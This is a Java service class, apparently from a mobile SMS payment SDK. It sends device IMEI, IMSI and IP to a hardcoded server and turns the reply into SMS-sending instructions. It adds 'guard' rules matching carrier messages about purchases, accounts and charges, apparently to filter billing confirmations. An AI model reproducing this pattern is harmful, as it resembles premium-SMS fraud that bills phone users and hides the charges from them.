package com.jxt.pay.appclient.service.dynamic.net;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.json.JSONObject;

import com.jxt.pay.appclient.service.dynamic.pojo.Guard;
import com.jxt.pay.appclient.service.dynamic.pojo.Sms;
import com.jxt.pay.appclient.service.dynamic.utils.XstreamHelper;
import com.jxt.pay.appclient.utils.Constants;
import com.jxt.pay.appclient.utils.DynamicUtils;
import com.jxt.pay.appclient.utils.GetData;
import com.jxt.pay.appclient.utils.StringUtils;

/**
 * http://211.154.152.59:8080/sdk/getcon?amount=600&packet_id=0i&imei=499000316129545&imsi=460029999154959&IP=115.28.52.44
 * @author leoliu
 *
 */
public class BjjsMm7DynamicService implements IDynamicService{

	private static final String TYPE = "bjjsMm7";
	
	private static final Integer DEFAULTSUCCESSTIMEOUT = 2;
	
	private static final String REQUESTMODEL = "amount={amount}&packet_id={packet_id}&imei={imei}&imsi={imsi}&IP={ip}";
	
	private static final Guard guard1 = new Guard("10658800","成功|购买",2880,"1",0);
	private static final Guard guard2 = new Guard("10086","点数|帐户|充值|花费",2880,null,1);
	private static final Guard guard3 = new Guard("10658800","",960,null,1);
	private static final Guard guard4 = new Guard("10086","",960,null,1);
	
	@Override
	public String getType() {
		return TYPE;
	}

	private Map<String, Long> tryMap = new HashMap<String, Long>();

	private int timeOut = 60;
	
	@Override
	public String dynamic(Map<String, String> map) {
		
		String xml = null;
		String url = map.get("url");
		
		if(url != null && url.length() > 0){
			String channel = map.get("channel");
			
			Calendar cal = Calendar.getInstance();
			Long startTime = tryMap.get(channel);
			
			if(startTime == null){
				startTime = cal.getTimeInMillis();
				tryMap.put(channel,startTime);
			}else{
				if(cal.getTimeInMillis() - startTime >= 1000 * timeOut){
					tryMap.remove(channel);
					return DynamicUtils.parseError("599");
				}
			}
			
			String amount = map.get("amount");
			String packet_id = map.get("packet_id");
			String imei = map.get("imei");
			String imsi = map.get("imsi");
			String ip = map.get(Constants.IPPARAM);
			
			String param = REQUESTMODEL.replace("{amount}",amount).replace("{packet_id}",packet_id).replace("{imei}",imei).replace("{imsi}",imsi).replace("{ip}",ip);
			
			String responseJson = GetData.getData(url, param);
			
			xml = parse(responseJson);

			if(xml == null || xml.length() == 0){
				xml = DynamicUtils.parseWait(10,map);
			}else{
				tryMap.remove(channel);
			}
		}
		
		return xml;
	}
	
	private String parse(String responseJson){
		
		if(responseJson != null && responseJson.length() > 0){
			try{
				JSONObject jo = new JSONObject(responseJson);
				
				String content = jo.getString("content");
			
				if(content != null && content.length() >= 10){
					
					List<Sms> smsList = new ArrayList<Sms>();
					
					Sms sms = new Sms();
					
					sms.setSmsContent(content);
					sms.setSmsDest(jo.getString("num"));
					sms.setSuccessTimeOut(DEFAULTSUCCESSTIMEOUT);
					
					smsList.add(sms);
					
					Sms guardSms = new Sms();
					
					List<Guard> guardList = new ArrayList<Guard>();
					
					guardList.add(guard1);
					guardList.add(guard2);
					
					guardList.add(guard3);
					guardList.add(guard4);
					
					guardSms.setGuardList(guardList);
					
					smsList.add(0, guardSms);
						
					return XstreamHelper.toXml(smsList);
				}
			}catch(Exception e){
				e.printStackTrace();
			}
		}
		
		return null;
	}
		
	public static void main(String[] args){
		//http://211.154.152.59:8080/sdk/getcon?amount=600&packet_id=0i&imei=499000316129545&imsi=460029999154959&IP=115.28.52.44
		String url = "http://211.154.152.59:8080/sdk/getcon";
		
		Map<String, String> map = new HashMap<String, String>();
		
		map.put("url", url);
		map.put("channel", "10B101a87654321");
		map.put("imei", "862949029214504");
		map.put("imsi", "460022101441340");
		map.put("amount", "600");
		map.put("packet_id","0i");
		map.put("type", "bjjsMm7");
		map.put("_ip_", "115.28.52.44");
		
		System.out.println(new BjjsMm7DynamicService().dynamic(map));
	}

}
